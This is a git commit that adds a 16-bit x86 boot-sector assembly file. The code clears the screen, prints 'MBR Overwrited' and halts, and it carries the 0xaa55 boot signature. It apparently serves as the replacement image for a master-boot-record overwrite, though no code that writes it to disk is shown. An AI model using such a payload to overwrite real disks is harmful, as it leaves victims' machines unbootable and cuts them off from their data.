64e1e9cfb4d2e39394e17a5432f889560e29079a
Android1337 <51016908+Android1337@users.noreply.github.com>
2021-06-30 14:46:52 +0200

    The assembly

---
+++ assembly.asm
@@ -0,0 +1,42 @@
+BITS    16
+ORG     0x7c00
+jmp start
+
+start:
+        call cls
+        mov ax,cs
+        mov ds,ax
+        mov si,message
+
+        call print
+
+print:
+        push ax
+        cld
+next:
+        mov al,[si]
+        cmp al,0
+        je done
+        call printtext
+        inc si
+        jmp next
+done:
+        jmp $
+
+printtext:
+        mov ah,0x0e
+        int 0x10
+        ret
+
+cls:
+        mov ah, 0x07
+        mov al, 0x00
+        mov bh, 0x09 
+        mov cx, 0x0000 
+        mov dx, 0x184f
+        int 0x10
+        ret
+
+message:            db        "MBR Overwrited", 0
+times 510 - ($-$$) db 0
+dw        0xaa55
